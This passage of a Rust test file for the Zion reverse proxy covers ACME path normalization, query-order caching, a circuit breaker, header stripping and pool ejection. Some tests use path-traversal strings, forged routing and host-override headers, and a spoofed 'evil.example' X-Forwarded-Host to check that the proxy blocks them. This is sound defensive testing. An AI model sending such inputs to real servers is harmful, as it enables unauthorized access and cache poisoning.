        o.last_target.lock().unwrap().as_deref(),
        Some("/.well-known/acme-challenge/abc")
    );
    // spellings that normalize to a challenge path ARE a challenge path, forwarded normalized
    let (status, _) = http80(&st, "//.well-known/./acme-challenge//def").await;
    assert_ne!(status, 301);
    assert_eq!(
        o.last_target.lock().unwrap().as_deref(),
        Some("/.well-known/acme-challenge/def")
    );
    let before = hits(&o);
    // ...and ones that normalize to something else are not: redirected to https, never forwarded
    for p in [
        "/.well-known/acme-challenge/../../secret",
        "/.well-known/acme-challenge/%2e%2e/%2e%2e/secret",
    ] {
        let (status, loc) = http80(&st, p).await;
        assert_eq!(status, 301, "{p}");
        assert_eq!(loc, "https://example.test/secret", "{p}");
    }
    assert_eq!(hits(&o), before, "nothing reached the upstream");
}

// ── opt-in: parameter order does not split the cache ────────────────────────

#[tokio::test]
async fn query_parameter_order_splits_the_cache_unless_the_profile_opts_in() {
    // off by default: two orders are two entries
    let (o, st) = rig("").await;
    fetch(&st, "/qa?b=2&a=1", &[]).await;
    settle().await;
    assert_eq!(fetch(&st, "/qa?a=1&b=2", &[]).await.0, "MISS");
    assert_eq!(hits(&o), 2);

    // opted in: one entry for both orders, and the upstream still sees what the client wrote
    let (o, st) = rig_with("", "public, max-age=60", "normalize_query = true").await;
    fetch(&st, "/qb?b=2&a=1", &[]).await;
    settle().await;
    assert_eq!(
        o.last_target.lock().unwrap().as_deref(),
        Some("/qb?b=2&a=1")
    );
    let (c, _) = fetch(&st, "/qb?a=1&b=2", &[]).await;
    assert_eq!(
        c, "HIT",
        "the same parameters in another order are the same entry"
    );
    assert_eq!(hits(&o), 1);
}

#[tokio::test]
async fn sorting_never_merges_different_parameters_or_reorders_repeated_ones() {
    let (o, st) = rig_with("", "public, max-age=60", "normalize_query = true").await;
    for q in [
        "/qc?x=1",
        "/qc?x=2",     // different value
        "/qc?x=1&y=",  // extra parameter
        "/qc?x=1&x=2", // repeated name, order significant
        "/qc?x=2&x=1", // ...so this is not the same
        "/qc?X=1",     // names are case-sensitive
    ] {
        fetch(&st, q, &[]).await;
        settle().await;
    }
    assert_eq!(hits(&o), 6, "six distinct requests, six distinct entries");
    // and a reordering of an already-seen set IS a hit
    assert_eq!(fetch(&st, "/qc?y=&x=1", &[]).await.0, "HIT");
    assert_eq!(hits(&o), 6);
}

#[tokio::test]
async fn a_mutation_invalidates_every_ordering_of_its_query() {
    let (o, st) = rig_with("", "public, max-age=60", "normalize_query = true").await;
    fetch(&st, "/qd?b=2&a=1", &[]).await;
    settle().await;
    assert_eq!(fetch(&st, "/qd?a=1&b=2", &[]).await.0, "HIT");
    send(&st, Method::POST, "/qd").await;
    settle().await;
    assert_eq!(fetch(&st, "/qd?a=1&b=2", &[]).await.0, "MISS");
    let _ = o;
}

/// The RAM cache survives a config reload. Entries stored while `normalize_query` was on live
/// under sorted keys; turning it off (because order matters) must not let a raw request be
/// served one of them, and turning it on must not mix its entries with the raw ones.
#[tokio::test]
async fn toggling_normalize_query_across_a_reload_never_aliases_entries() {
    use crate::state::ResolvedAppConfig;
    let reload = |st: &Arc<AppState>, port: u16, extra: &str| {
        let cfg = ResolvedAppConfig::try_build(&cfg_for(port, extra), 1024).unwrap();
        st.config.store(Arc::new(cfg));
    };
    // on -> off
    let (o, st) = rig_with("", "public, max-age=60", "normalize_query = true").await;
    let port = o.port.load(Ordering::Relaxed);
    fetch(&st, "/qr?b=2&a=1", &[]).await;
    settle().await;
    reload(&st, port, "normalize_query = false");
    let (c, _) = fetch(&st, "/qr?a=1&b=2", &[]).await;
    assert_eq!(
        c, "MISS",
        "raw request must not be served the entry stored under the sorted key"
    );
    assert_eq!(hits(&o), 2);
    // off -> on
    let (o, st) = rig_with("", "public, max-age=60", "").await;
    let port = o.port.load(Ordering::Relaxed);
    fetch(&st, "/qs?a=1&b=2", &[]).await;
    settle().await;
    reload(&st, port, "normalize_query = true");
    let (c, _) = fetch(&st, "/qs?b=2&a=1", &[]).await;
    assert_eq!(
        c, "MISS",
        "an entry stored in raw mode is not the sorted-mode entry"
    );
    settle().await;
    assert_eq!(
        fetch(&st, "/qs?a=1&b=2", &[]).await.0,
        "HIT",
        "and sorted mode works after the reload"
    );
    assert_eq!(hits(&o), 2);
}

// ── circuit breaker (opt-in, per upstream) ──────────────────────────────────

/// A catch-all route to the origin through an `[upstream.o]` TABLE (the breaker lives there).
fn cfg_with_breaker(port: u16, breaker: &str, route_extra: &str) -> ZionConfig {
    let toml = format!(
        r#"
[server]
listen_http = "127.0.0.1:0"
listen_https = "127.0.0.1:0"

[tls]
cert_path = "/c"
key_path = "/k"

[upstream.o]
url = "http://127.0.0.1:{port}"
{breaker}

[cache_profile.c]
ttl_seconds = 3600
max_entries = 100

[[route]]
path = "/plain/{{*rest}}"
upstream = "o"

[[route]]
path = "/cached/{{*rest}}"
upstream = "o"
mode = "static_cache"
cache_profile = "c"
{route_extra}
"#
    );
    toml::from_str::<ZionConfig>(&toml).expect("config parses")
}

const BREAKER: &str =
    "circuit_breaker = { error_rate_pct = 50, min_requests = 4, window_secs = 10, open_secs = 2 }";

async fn breaker_rig(breaker: &str) -> (Arc<Origin>, Arc<AppState>) {
    let (o, _) = rig("").await;
    let port = o.port.load(Ordering::Relaxed);
    (o, AppState::for_tests(&cfg_with_breaker(port, breaker, "")))
}

/// (status, X-Zion-Circuit, Retry-After)
async fn call(st: &Arc<AppState>, uri: &str) -> (u16, String, String) {
    let resp = process_request(
        get(uri, &[]),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    let h = |n: &str| {
        resp.headers()
            .get(n)
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string()
    };
    (
        resp.status().as_u16(),
        h("x-zion-circuit"),
        h("retry-after"),
    )
}

#[tokio::test]
async fn a_failing_upstream_trips_the_breaker_and_stops_receiving_traffic() {
    let (o, st) = breaker_rig(BREAKER).await;
    // healthy traffic is untouched
    for i in 0..6 {
        assert_eq!(call(&st, &format!("/plain/ok{i}")).await.0, 200);
    }
    let healthy_hits = hits(&o);
    o.status.store(503, Ordering::Relaxed);
    // failures reach the origin until the threshold (min 4 requests, 50%) is crossed
    let mut tripped_at = None;
    for i in 0..30 {
        let (s, circuit, _) = call(&st, &format!("/plain/f{i}")).await;
        if circuit == "open" {
            tripped_at = Some(i);
            assert_eq!(s, 503);
            break;
        }
        assert_eq!(
            s, 503,
            "the origin's own 503 is passed through while the circuit is closed"
        );
    }
    let tripped_at = tripped_at.expect("the breaker must open");
    assert!(tripped_at < 12, "opened after {tripped_at} failures");
    let at_trip = hits(&o);
    assert!(at_trip > healthy_hits);
    // while open: instant rejection with Retry-After, and the origin is not contacted
    for i in 0..10 {
        let (s, circuit, retry) = call(&st, &format!("/plain/open{i}")).await;
        assert_eq!((s, circuit.as_str()), (503, "open"));
        assert!(
            retry.parse::<u64>().is_ok_and(|r| (1..=2).contains(&r)),
            "Retry-After {retry:?}"
        );
    }
    assert_eq!(hits(&o), at_trip, "an open circuit sends nothing upstream");
}

#[tokio::test]
async fn it_recovers_through_a_single_probe() {
    let (o, st) = breaker_rig(BREAKER).await;
    o.status.store(503, Ordering::Relaxed);
    for i in 0..10 {
        call(&st, &format!("/plain/a{i}")).await;
    }
    assert_eq!(call(&st, "/plain/x").await.1, "open");
    let at_open = hits(&o);
    o.status.store(200, Ordering::Relaxed); // the upstream has recovered
    tokio::time::sleep(Duration::from_millis(2300)).await; // open_secs = 2

    // concurrent requests after the cool-down: exactly one is the probe
    let results = tokio::join!(
        call(&st, "/plain/p1"),
        call(&st, "/plain/p2"),
        call(&st, "/plain/p3"),
        call(&st, "/plain/p4"),
    );
    let rs = [results.0, results.1, results.2, results.3];
    let passed = rs.iter().filter(|r| r.0 == 200).count();
    let rejected = rs.iter().filter(|r| r.1 == "open").count();
    assert_eq!(passed, 1, "exactly one probe goes through: {rs:?}");
    assert_eq!(rejected, 3);
    assert_eq!(hits(&o), at_open + 1);
    // and its success closes the circuit
    for i in 0..5 {
        assert_eq!(call(&st, &format!("/plain/c{i}")).await.0, 200);
    }
}

#[tokio::test]
async fn a_failed_probe_reopens_the_circuit() {
    let (o, st) = breaker_rig(BREAKER).await;
    o.status.store(503, Ordering::Relaxed);
    for i in 0..10 {
        call(&st, &format!("/plain/b{i}")).await;
    }
    tokio::time::sleep(Duration::from_millis(2300)).await;
    let (s, circuit, _) = call(&st, "/plain/probe").await; // the probe: still failing
    assert_eq!(
        (s, circuit.as_str()),
        (503, ""),
        "the probe reaches the origin and gets its 503"
    );
    assert_eq!(
        call(&st, "/plain/after").await.1,
        "open",
        "so the circuit is open again"
    );
}

#[tokio::test]
async fn what_does_not_count_does_not_trip_it() {
    // below the minimum request count
    let (o, st) = breaker_rig(BREAKER).await;
    o.status.store(503, Ordering::Relaxed);
    for i in 0..3 {
        call(&st, &format!("/plain/m{i}")).await;
    }
    assert_ne!(
        call(&st, "/plain/m-next").await.1,
        "open",
        "3 failures is under min_requests = 4... until the 4th"
    );
    // application errors and client errors are not a sick upstream
    for status in [400u16, 401, 404, 429, 500] {
        let (o, st) = breaker_rig(BREAKER).await;
        o.status.store(status, Ordering::Relaxed);
        for i in 0..20 {
            assert_eq!(
                call(&st, &format!("/plain/e{status}x{i}")).await.1,
                "",
                "{status}"
            );
        }
        assert_eq!(hits(&o), 20, "{status}: every request reached the origin");
    }
    // a low failure rate: 1 in 10
    let (o, st) = breaker_rig(BREAKER).await;
    for i in 0..30 {
        o.status
            .store(if i % 10 == 0 { 503 } else { 200 }, Ordering::Relaxed);
        assert_ne!(
            call(&st, &format!("/plain/r{i}")).await.1,
            "open",
            "request {i}"
        );
    }
}

#[tokio::test]
async fn without_the_option_nothing_ever_trips() {
    let (o, st) = breaker_rig("").await;
    o.status.store(503, Ordering::Relaxed);
    for i in 0..40 {
        assert_eq!(
            call(&st, &format!("/plain/n{i}")).await,
            (503, String::new(), String::new())
        );
    }
    assert_eq!(hits(&o), 40);
}

#[tokio::test]
async fn on_a_cached_route_an_open_circuit_serves_the_stale_copy_otherwise_503() {
    let (o, _) = rig_with("", "public, max-age=1", "").await;
    let port = o.port.load(Ordering::Relaxed);
    let st = AppState::for_tests(&cfg_with_breaker(port, BREAKER, ""));
    // fill one entry while healthy, then let it go stale
    // `fetch` reads the body to the end, which is what lets the cache keep the entry
    assert!(!fetch(&st, "/cached/kept", &[]).await.1.is_empty());
    settle().await;
    tokio::time::sleep(Duration::from_millis(1300)).await;
    // the origin starts failing; distinct uncached URLs trip the circuit
    o.status.store(503, Ordering::Relaxed);
    for i in 0..10 {
        call(&st, &format!("/cached/new{i}")).await;
    }
    assert_eq!(
        call(&st, "/cached/another").await.1,
        "open",
        "no cached copy: the client gets the 503"
    );
    let before = hits(&o);
    // the stale entry is served instead of an error, without touching the origin
    let resp = process_request(
        get("/cached/kept", &[]),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    assert_eq!(resp.status().as_u16(), 200);
    assert_eq!(resp.headers().get("x-zion-cache").unwrap(), "STALE");
    assert_eq!(
        hits(&o),
        before,
        "the open circuit kept the origin out of it"
    );
}

/// The real reload path (`reload::rebuild`): the health entry and its history are reused, and
/// the breaker's thresholds are taken from the NEW config: added, changed and removed.
#[tokio::test]
async fn a_reload_adds_changes_and_removes_the_breaker_through_the_real_rebuild() {
    let (o, st) = breaker_rig("").await;
    let port = o.port.load(Ordering::Relaxed);
    let url = format!("http://127.0.0.1:{port}");
    let rebuild = |st: &Arc<AppState>, breaker: &str| {
        let previous = st.cfg();
        let next = crate::reload::rebuild(&cfg_with_breaker(port, breaker, ""), &previous, 1024)
            .expect("config rebuilds");
        let (old, new) = (&previous.health_map[&url], &next.health_map[&url]);
        assert!(
            Arc::ptr_eq(old, new),
            "the health entry is reused across the reload"
        );
        st.config.store(Arc::new(next));
    };
    let breaker_cfg = |st: &Arc<AppState>| st.cfg().health_map[&url].breaker.cfg();
    assert_eq!(breaker_cfg(&st), None);

    // added
    rebuild(&st, BREAKER);
    assert_eq!(
        breaker_cfg(&st).map(|c| (c.error_rate_pct, c.min_requests, c.window_secs, c.open_secs)),
        Some((50, 4, 10, 2))
    );
    o.status.store(503, Ordering::Relaxed);
    for i in 0..10 {
        call(&st, &format!("/plain/add{i}")).await;
    }
    assert_eq!(
        call(&st, "/plain/add-next").await.1,
        "open",
        "the added breaker works"
    );

    // changed: new thresholds start clean (the open circuit is forgotten)
    rebuild(
        &st,
        "circuit_breaker = { error_rate_pct = 90, min_requests = 50, window_secs = 5, open_secs = 7 }",
    );
    assert_eq!(
        breaker_cfg(&st).map(|c| (c.error_rate_pct, c.min_requests, c.window_secs, c.open_secs)),
        Some((90, 50, 5, 7))
    );
    assert_ne!(
        call(&st, "/plain/chg").await.1,
        "open",
        "a changed breaker starts closed"
    );

    // unchanged thresholds keep the history across a reload
    rebuild(&st, "circuit_breaker = { error_rate_pct = 90, min_requests = 50, window_secs = 5, open_secs = 7 }");

    // removed: the circuit stops guarding the route
    rebuild(&st, "");
    assert_eq!(breaker_cfg(&st), None);
    for i in 0..30 {
        assert_ne!(
            call(&st, &format!("/plain/rm{i}")).await.1,
            "open",
            "no breaker, no rejections"
        );
    }
}

/// The breaker lives on a health entry shared by every upstream that names the URL, so two
/// definitions of one URL must agree about it.
#[tokio::test]
async fn two_upstreams_sharing_a_url_must_agree_about_its_breaker() {
    let cfg = |a: &str, b: &str| {
        format!(
            "[server]\nlisten_http=\"0.0.0.0:80\"\nlisten_https=\"0.0.0.0:443\"\n\
             [tls]\ncert_path=\"/c\"\nkey_path=\"/k\"\n\
             [upstream.a]\nurl=\"http://127.0.0.1:8000\"\n{a}\n\
             [upstream.b]\nurl=\"http://127.0.0.1:8000\"\n{b}\n\
             [[route]]\npath=\"/a/{{*r}}\"\nupstream=\"a\"\n\
             [[route]]\npath=\"/b/{{*r}}\"\nupstream=\"b\"\n"
        )
    };
    let cb = "circuit_breaker = { open_secs = 5 }";
    let err = |a: &str, b: &str| {
        crate::config::validate_str(&cfg(a, b), "t")
            .err()
            .unwrap_or_default()
    };
    assert!(
        err(cb, "").contains("disagree about its circuit breaker"),
        "one has it, one does not"
    );
    assert!(
        err(cb, "circuit_breaker = { open_secs = 6 }").contains("disagree"),
        "different thresholds"
    );
    assert!(
        !err(cb, cb).contains("disagree"),
        "identical definitions are fine"
    );
    assert!(!err("", "").contains("disagree"), "neither has one: fine");
}

fn ws_request(uri: &str) -> Request<ZionBody> {
    get(
        uri,
        &[
            ("connection", "Upgrade"),
            ("upgrade", "websocket"),
            ("sec-websocket-version", "13"),
            ("sec-websocket-key", "AAAAAAAAAAAAAAAAAAAAAA=="),
        ],
    )
}

async fn ws_status(st: &Arc<AppState>, uri: &str) -> (u16, String) {
    let resp = process_request(
        ws_request(uri),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    (
        resp.status().as_u16(),
        resp.headers()
            .get("x-zion-circuit")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string(),
    )
}

/// A WebSocket handshake is a request to the upstream like any other: it is refused while the
/// circuit is open, and a failed handshake counts toward opening it.
#[tokio::test]
async fn websocket_handshakes_are_guarded_and_counted() {
    let (o, st) = breaker_rig(BREAKER).await;
    o.status.store(503, Ordering::Relaxed);
    // failed handshakes alone open the circuit
    let mut opened = false;
    for i in 0..12 {
        let (s, circuit) = ws_status(&st, &format!("/plain/ws{i}")).await;
        if circuit == "open" {
            assert_eq!(s, 503);
            opened = true;
            break;
        }
    }
    assert!(
        opened,
        "503s answering WebSocket handshakes must trip the breaker"
    );
    let before = hits(&o);
    let (s, circuit) = ws_status(&st, "/plain/ws-after").await;
    assert_eq!((s, circuit.as_str()), (503, "open"));
    // an upgrade on a CACHED route skips the cache handler, so the circuit must catch it first
    let (s, circuit) = ws_status(&st, "/cached/ws-after").await;
    assert_eq!(
        (s, circuit.as_str()),
        (503, "open"),
        "websocket on a cached route"
    );
    // ordinary requests are refused by the same circuit, and the origin is left alone
    assert_eq!(call(&st, "/plain/after-ws").await.1, "open");
    assert_eq!(hits(&o), before);
}

/// The path that bypasses the cache because a varied request header is too long to key on still
/// contacts the origin, so the circuit applies to it too.
#[tokio::test]
async fn the_overlong_header_cache_bypass_respects_the_circuit() {
    let (o, _) = rig_with("X-Foo", "public, max-age=60", "").await;
    let port = o.port.load(Ordering::Relaxed);
    let st = AppState::for_tests(&cfg_with_breaker(port, BREAKER, ""));
    // learn that /cached/* varies on X-Foo
    assert_eq!(fetch(&st, "/cached/v", &[("x-foo", "a")]).await.0, "MISS");
    settle().await;
    // open the circuit with failing requests on another path
    o.status.store(503, Ordering::Relaxed);
    for i in 0..10 {
        call(&st, &format!("/plain/o{i}")).await;
    }
    assert_eq!(call(&st, "/plain/o-next").await.1, "open");
    let before = hits(&o);
    let long = "x".repeat(crate::vary::MAX_VALUE_LEN + 100);
    let resp = process_request(
        get("/cached/v", &[("x-foo", long.as_str())]),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    assert_eq!(resp.status().as_u16(), 503);
    assert_eq!(resp.headers().get("x-zion-circuit").unwrap(), "open");
    assert_eq!(hits(&o), before, "the bypass path did not reach the origin");
}

/// A write to a cached route goes straight to the upstream, so it is guarded as well.
#[tokio::test]
async fn writes_to_a_cached_route_respect_the_circuit() {
    let (o, st) = breaker_rig(BREAKER).await;
    o.status.store(503, Ordering::Relaxed);
    for i in 0..10 {
        call(&st, &format!("/plain/w{i}")).await;
    }
    assert_eq!(call(&st, "/plain/w-next").await.1, "open");
    let before = hits(&o);
    let resp = process_request(
        {
            let mut r = get("/cached/item", &[]);
            *r.method_mut() = Method::POST;
            r
        },
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    assert_eq!(resp.status().as_u16(), 503);
    assert_eq!(resp.headers().get("x-zion-circuit").unwrap(), "open");
    assert_eq!(hits(&o), before);
}

/// A background refresh must not take the half-open probe slot: it cannot report an outcome
/// for the circuit, so it would strand the slot and delay recovery.
#[tokio::test]
async fn a_background_refresh_never_takes_the_half_open_probe() {
    let (o, _) = rig_with("", "public, max-age=1, stale-while-revalidate=60", "").await;
    let port = o.port.load(Ordering::Relaxed);
    let st = AppState::for_tests(&cfg_with_breaker(port, BREAKER, ""));
    fetch(&st, "/cached/hp", &[]).await;
    settle().await;
    o.status.store(503, Ordering::Relaxed);
    for i in 0..10 {
        call(&st, &format!("/plain/h{i}")).await;
    }
    assert_eq!(call(&st, "/plain/h-open").await.1, "open");
    o.status.store(200, Ordering::Relaxed); // recovered
    tokio::time::sleep(Duration::from_millis(2300)).await; // cool-down over: half-open
    let before = hits(&o);
    // a stale-but-refreshable entry is requested first: served at once, refresh held back
    let (c, _) = fetch(&st, "/cached/hp", &[]).await;
    assert_eq!(c, "STALE-WHILE-REVALIDATE");
    settle().await;
    assert_eq!(
        hits(&o),
        before,
        "no refresh while the circuit is not closed"
    );
    // and the probe slot is still free for a foreground request, which recovers the circuit
    assert_eq!(
        call(&st, "/plain/h-probe").await.0,
        200,
        "the foreground request is the probe"
    );
    assert_eq!(hits(&o), before + 1);
    assert_eq!(call(&st, "/plain/h-after").await.0, 200, "closed again");
}

// ── routing/host override headers from the client ───────────────────────────

/// The headers only a trusted proxy may set: the single list in `reserved_headers`.
fn rewrite_headers() -> Vec<&'static str> {
    crate::reserved_headers::reserved(crate::reserved_headers::Asserter::TrustedProxy).collect()
}

fn seen(o: &Origin, name: &str) -> Option<String> {
    o.last_headers
        .lock()
        .unwrap()
        .iter()
        .find(|(k, _)| k == name)
        .map(|(_, v)| v.clone())
}

fn hostile_headers() -> Vec<(&'static str, &'static str)> {
    rewrite_headers()
        .into_iter()
        .map(|h| (h, "/admin"))
        .collect()
}

/// A client must not be able to steer a framework that honours these headers (IIS and Symfony
/// take the path from `X-Original-URL` / `X-Rewrite-URL`, others the host or scheme from the
/// rest) behind Zion's routing and policy, or to poison a cache keyed on the real request.
#[tokio::test]
async fn untrusted_clients_cannot_send_routing_or_host_override_headers_upstream() {
    let (o, st) = rig("").await;
    let mut headers = hostile_headers();
    headers.push(("accept-language", "de"));
    headers.push(("x-custom", "kept"));
    fetch(&st, "/h1", &headers).await;
    for h in rewrite_headers() {
        assert_eq!(seen(&o, h), None, "{h} must not reach the upstream");
    }
    // control: ordinary headers are untouched, and Zion's own trust headers are set
    assert_eq!(seen(&o, "accept-language").as_deref(), Some("de"));
    assert_eq!(seen(&o, "x-custom").as_deref(), Some("kept"));
    assert!(seen(&o, "x-forwarded-for").is_some() && seen(&o, "x-forwarded-proto").is_some());
}

/// What only Zion's pipeline may assert (the authenticated identity, the mesh reputation)
/// is dropped from every request, a trusted proxy's included: no peer speaks for the auth
/// gate or the mesh. `X-Zion-Mesh-Score` used to pass straight through, so a client could
/// hand the upstream a reputation of its own choosing (ZION-AUTH-07).
#[tokio::test]
async fn nobody_can_send_what_only_the_pipeline_asserts() {
    use crate::reserved_headers::{reserved, Asserter};
    let (o, _) = rig("").await;
    let port = o.port.load(Ordering::Relaxed);
    let mut cfg = cfg_for(port, "");
    cfg.server.trusted_proxies = vec!["203.0.113.0/24".to_string()];
    let st = AppState::for_tests(&cfg);
    let forged: Vec<(&str, &str)> = reserved(Asserter::Pipeline)
        .map(|h| (h, "forged"))
        .collect();
    assert!(forged.iter().any(|(h, _)| *h == "x-zion-mesh-score"));
    for (peer, who) in [
        ("198.51.100.7:1", "a client"),
        ("203.0.113.9:1", "a trusted proxy"),
    ] {
        let resp = process_request(
            get(&format!("/p-{}", who.len()), &forged),
            st.clone(),
            peer.parse::<SocketAddr>().unwrap(),
            false,
        )
        .await
        .unwrap();
        assert_eq!(resp.status(), 200);
        let _ = resp.into_body().collect().await;
        for (h, _) in &forged {
            assert_eq!(seen(&o, h), None, "{h} from {who} reached the upstream");
        }
    }
}

#[tokio::test]
async fn x_forwarded_host_is_the_requests_own_host_whatever_the_client_claims() {
    let (o, st) = rig("").await;
    fetch(
        &st,
        "/h2",
        &[
            ("host", "real.example"),
            ("x-forwarded-host", "evil.example"),
        ],
    )
    .await;
    assert_eq!(
        seen(&o, "x-forwarded-host").as_deref(),
        Some("real.example")
    );
}

/// A configured trusted proxy (a CDN or load balancer in front of Zion) legitimately sets some
/// of these; its values are passed through, as with `X-Forwarded-For`.
#[tokio::test]
async fn a_trusted_proxy_peer_keeps_its_headers() {
    let (o, _) = rig("").await;
    let port = o.port.load(Ordering::Relaxed);
    let mut cfg = cfg_for(port, "");
    cfg.server.trusted_proxies = vec!["203.0.113.0/24".to_string()];
    let st = AppState::for_tests(&cfg);
    // the peer used by `fetch` is 203.0.113.9: trusted here
    fetch(&st, "/h3", &hostile_headers()).await;
    for h in rewrite_headers() {
        assert_eq!(
            seen(&o, h).as_deref(),
            Some("/admin"),
            "{h} from a trusted proxy is kept"
        );
    }
    // and an untrusted peer on the same instance is still stripped
    let resp = process_request(
        get("/h4", &hostile_headers()),
        st.clone(),
        "198.51.100.7:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    let _ = resp.into_body().collect().await;
    for h in rewrite_headers() {
        assert_eq!(seen(&o, h), None, "{h} from an untrusted peer is stripped");
    }
}

/// The plaintext :80 handler forwards ACME-challenge paths on its own, outside the pipeline.
#[tokio::test]
async fn the_port_80_acme_fallback_strips_them_too() {
    let (o, st) = rig("").await;
    let resp = crate::handle_http(
        get("/.well-known/acme-challenge/tok", &hostile_headers()),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
    )
    .await
    .unwrap();
    let _ = resp.into_body().collect().await;
    assert_eq!(hits(&o), 1, "the challenge path was forwarded");
    for h in rewrite_headers() {
        assert_eq!(
            seen(&o, h),
            None,
            "{h} must not reach the upstream from :80 either"
        );
    }
}

/// HTTP/2 carries the host in the URI authority and sends no Host header, and a hostless request
/// has neither: a client-supplied X-Forwarded-Host must not survive in either case.
#[tokio::test]
async fn x_forwarded_host_cannot_be_smuggled_through_a_request_without_a_host_header() {
    let (o, st) = rig("").await;
    // authority only (as h2): the upstream is told the authority, not the client's claim
    fetch(
        &st,
        "https://real.example/xh1",
        &[("x-forwarded-host", "evil.example")],
    )
    .await;
    assert_eq!(
        seen(&o, "x-forwarded-host").as_deref(),
        Some("real.example")
    );
    // neither: the claim is dropped rather than forwarded
    fetch(&st, "/xh2", &[("x-forwarded-host", "evil.example")]).await;
    assert_eq!(seen(&o, "x-forwarded-host"), None);
}

// ── pools: load-aware selection and passive ejection ────────────────────────

/// A pool of `n` in-process origins behind one `[upstream.p]` table, routed at `/pool/*`.
async fn pool_rig(n: usize, extra: &str) -> (Vec<Arc<Origin>>, Arc<AppState>) {
    let mut origins = Vec::new();
    for _ in 0..n {
        let (o, _) = rig("").await;
        origins.push(o);
    }
    let st = AppState::for_tests(&cfg_pool(&origins, extra));
    (origins, st)
}

fn cfg_pool(origins: &[Arc<Origin>], extra: &str) -> ZionConfig {
    let urls = origins
        .iter()
        .map(|o| format!("\"http://127.0.0.1:{}\"", o.port.load(Ordering::Relaxed)))
        .collect::<Vec<_>>()
        .join(", ");
    let toml = format!(
        r#"
[server]
listen_http = "127.0.0.1:0"
listen_https = "127.0.0.1:0"

[tls]
cert_path = "/c"
key_path = "/k"

[upstream.p]
urls = [{urls}]
{extra}

[[route]]
path = "/pool/{{*rest}}"
upstream = "p"
"#
    );
    toml::from_str::<ZionConfig>(&toml).expect("config parses")
}

const OUTLIER: &str =
    "outlier_detection = { error_rate_pct = 50, min_requests = 6, window_secs = 10, eject_secs = 30 }";

/// `n` requests, `width` at a time (so some are in flight together, as under real load).
async fn burst(st: &Arc<AppState>, tag: &str, n: usize, width: usize) -> Vec<u16> {
    let mut codes = Vec::new();
    let mut i = 0;
    while i < n {
        let batch = (n - i).min(width);
        let uris: Vec<String> = (0..batch)
            .map(|k| format!("/pool/{tag}{}", i + k))
            .collect();
        let results = join_all(uris.iter().map(|u| call(st, u))).await;
        codes.extend(results.into_iter().map(|(s, _, _)| s));
        i += batch;
    }
    codes
}

/// Poll all the futures together so their waits overlap (the test runtime is single-threaded).
async fn join_all<F: std::future::Future>(futs: impl Iterator<Item = F>) -> Vec<F::Output> {
    let mut pinned: Vec<std::pin::Pin<Box<F>>> = futs.map(Box::pin).collect();
    let mut results: Vec<Option<F::Output>> = (0..pinned.len()).map(|_| None).collect();
    std::future::poll_fn(|cx| {
        let mut pending = false;
        for (f, slot) in pinned.iter_mut().zip(results.iter_mut()) {
            if slot.is_none() {
                match f.as_mut().poll(cx) {
                    std::task::Poll::Ready(v) => *slot = Some(v),
                    std::task::Poll::Pending => pending = true,
                }
            }
        }
        if pending {
            std::task::Poll::Pending
        } else {
            std::task::Poll::Ready(())
        }
    })
    .await;
    results.into_iter().flatten().collect()
}

#[tokio::test]
async fn a_slow_member_gets_a_smaller_share_and_nobody_is_starved() {
    let (os, st) = pool_rig(3, "").await;
    os[2].delay_ms.store(150, Ordering::Relaxed); // one slow member
                                                  // warm the latency picture, then measure
    burst(&st, "w", 30, 6).await;
    let base: Vec<usize> = os.iter().map(|o| hits(o)).collect();
    burst(&st, "m", 120, 6).await;
    let got: Vec<usize> = os.iter().zip(&base).map(|(o, b)| hits(o) - b).collect();
    let total: usize = got.iter().sum();
    assert_eq!(total, 120);
    assert!(
        got[2] * 100 < total * 20,
        "the slow member should carry well under its fair third: {got:?}"
    );
    assert!(
        got[0] * 100 > total * 25 && got[1] * 100 > total * 25,
        "both fast members carry real load: {got:?}"
    );
}

#[tokio::test]
async fn the_previous_rule_is_still_available_and_herds_as_before() {
    let (os, st) = pool_rig(3, "load_balancing = \"lowest_latency\"").await;
    burst(&st, "l", 60, 6).await;
    let got: Vec<usize> = os.iter().map(|o| hits(o)).collect();
    assert_eq!(
        got.iter().filter(|&&h| h > 0).count(),
        1,
        "with equal probe latency one member takes all: {got:?}"
    );
}

#[tokio::test]
async fn a_member_that_keeps_failing_is_ejected_and_stops_receiving_traffic() {
    let (os, st) = pool_rig(3, OUTLIER).await;
    os[1].status.store(503, Ordering::Relaxed);
    // until it is ejected, its own 503s reach clients
    burst(&st, "e", 90, 6).await;
    let frozen = hits(&os[1]);
    assert!(frozen > 0, "it did receive traffic before being ejected");
    assert!(
        frozen < 40,
        "and was cut off long before the end: {frozen} of 90"
    );
    let codes = burst(&st, "after", 60, 6).await;
    assert_eq!(hits(&os[1]), frozen, "an ejected member receives nothing");
    assert!(
        codes.iter().all(|&c| c == 200),
        "clients now only see the healthy members: {codes:?}"
    );
    let ejections = st
        .cfg()
        .health_map
        .values()
        .map(|h| h.pool.ejections())
        .sum::<u64>();
    assert_eq!(ejections, 1);
}

#[tokio::test]
async fn a_pool_that_fails_everywhere_is_not_ejected_away() {
    let (os, st) = pool_rig(3, OUTLIER).await;
    for o in &os {
        o.status.store(503, Ordering::Relaxed);
    }
    burst(&st, "o", 90, 6).await;
    let before: Vec<usize> = os.iter().map(|o| hits(o)).collect();
    burst(&st, "o2", 30, 6).await;
    let after: Vec<usize> = os.iter().map(|o| hits(o)).collect();
    assert!(
        after.iter().zip(&before).all(|(a, b)| a > b),
        "every member is still tried: {before:?} -> {after:?}"
    );
    assert_eq!(
        st.cfg()
            .health_map
            .values()
            .map(|h| h.pool.ejections())
            .sum::<u64>(),
        0
    );
}

#[tokio::test]
async fn an_ejected_member_returns_after_its_cool_down() {
    let (os, st) = pool_rig(2, "outlier_detection = { error_rate_pct = 50, min_requests = 4, window_secs = 10, eject_secs = 1 }").await;
